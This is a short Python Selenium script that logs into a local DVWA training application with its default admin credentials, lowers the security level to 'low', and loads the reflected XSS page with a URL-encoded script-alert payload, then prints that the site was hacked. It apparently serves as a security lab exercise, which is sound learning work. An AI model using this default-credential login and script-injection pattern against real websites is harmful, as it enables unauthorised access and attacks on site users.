from selenium import webdriver
from selenium.webdriver.support.ui import Select
import time
import re


driver = webdriver.Chrome()
driver.get("http://localhost/DVWA")

username = 'admin'
password = 'password'

# Find the username and password input fields on the login page using various locators
username_field = driver.find_element('name', 'username')  
password_field = driver.find_element('name', 'password') 

# Enter the username and password into their respective fields
username_field.send_keys(username)
password_field.send_keys(password)

# Find and click the login button
login_button = driver.find_element('name', 'Login')  
login_button.click()

# After logging in, navigate to the desired page
driver.get("http://localhost/DVWA/security.php")

select_element = driver.find_element('name', 'security') 

# Use the Select class to interact with the <select> element
select = Select(select_element)

# Select the option with value "low"
select.select_by_value('low')

submit_button = driver.find_element('name', 'seclev_submit')
submit_button.click()


print("Attempting Xss...")
driver.get(f"http://localhost/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22You+have+just+been+hacked%21%22%29%3C%2Fscript%3E#")
time.sleep(5)
print("Site hacked successfully using XSS!")

    